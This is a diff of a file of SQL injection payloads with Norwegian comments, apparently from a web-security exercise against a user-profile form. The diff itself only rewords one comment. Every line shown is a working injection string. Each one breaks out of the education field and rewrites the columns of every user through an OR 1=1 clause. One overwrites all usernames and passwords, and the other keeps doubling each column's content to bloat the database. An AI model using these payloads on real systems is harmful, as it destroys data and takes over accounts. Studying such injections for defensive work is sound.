@@ -62,5 +62,5 @@ INPUT_education', employment= employment || employment WHERE username='test';/*
 # Denne gir basis til angrepet
 INPUT_education', username= 'test', first_name= 'fname', last_name= 'lastname', password= 'password', education= 'education', employment= 'education', music= 'music', movie= 'movie', nationality= 'nationality', birthday= birthday WHERE username='' OR 1=1;/*
 
-# Denne fyller alle brukeres kolonner
+# Denne fyller alle brukeres kolonner med den seg selv, dv kvadrerer innholdet pr runde
 INPUT_education', username= 'test', first_name= first_name || first_name, last_name= last_name || last_name, password= password || password, education= education || education, employment= employment || employment, music= music || music, movie= movie || movie, nationality= nationality || nationality, birthday= birthday WHERE username='' OR 1=1;/*
